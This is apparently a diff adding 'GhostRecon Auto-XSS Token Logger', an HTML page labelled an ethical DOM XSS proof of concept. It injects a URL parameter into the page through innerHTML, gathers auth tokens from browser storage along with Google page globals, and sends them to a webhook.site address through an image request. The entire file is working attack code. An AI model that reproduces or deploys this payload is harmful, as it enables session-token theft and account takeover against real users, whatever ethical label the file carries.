@@ -1,0 +1,48 @@
+<!--
+👻 GhostRecon Auto-XSS Token Logger v2.0
+🧠 Hussein Abdullah ALMukhles – Fast CyberSecurity
+📅 Generated: 2025-05-11 12:12:22
+🛡️ Ethical DOM XSS PoC – Extracts tokens & sends to Webhook via Image.src
+-->
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>GhostRecon XSS Auto Execution</title>
+</head>
+<body>
+  <h2>GhostRecon – XSS Executed</h2>
+  <script>
+    (function () {
+      const params = new URLSearchParams(window.location.search);
+      const payload = params.get('xss');
+
+      if (payload) {
+        const div = document.createElement("div");
+        div.innerHTML = payload;
+        document.body.appendChild(div);
+      }
+
+      // Extract token data
+      const token = localStorage.getItem("authToken") || sessionStorage.getItem("authToken") || "N/A";
+      const wiz = window.WIZ_global_data || "N/A";
+      const afData = window.AF_dataServiceRequests || "N/A";
+      const afQueue = window.AF_initDataChunkQueue || "N/A";
+
+      const data = {
+        timestamp: new Date().toLocaleString(),
+        page: location.href,
+        token: token,
+        WIZ: typeof wiz === 'object' ? '[Object]' : wiz.toString().substring(0, 150),
+        AF_data: typeof afData === 'object' ? '[Object]' : afData.toString().substring(0, 150),
+        AF_queue: typeof afQueue === 'object' ? '[Object]' : afQueue.toString().substring(0, 150)
+      };
+
+      const encoded = encodeURIComponent(JSON.stringify(data));
+      const img = new Image();
+      img.src = "https://webhook.site/e25c5eed-1862-4da1-aed9-9c8257ea879b?xssleak=" + encoded;
+    })();
+  </script>
+</body>
+</html>
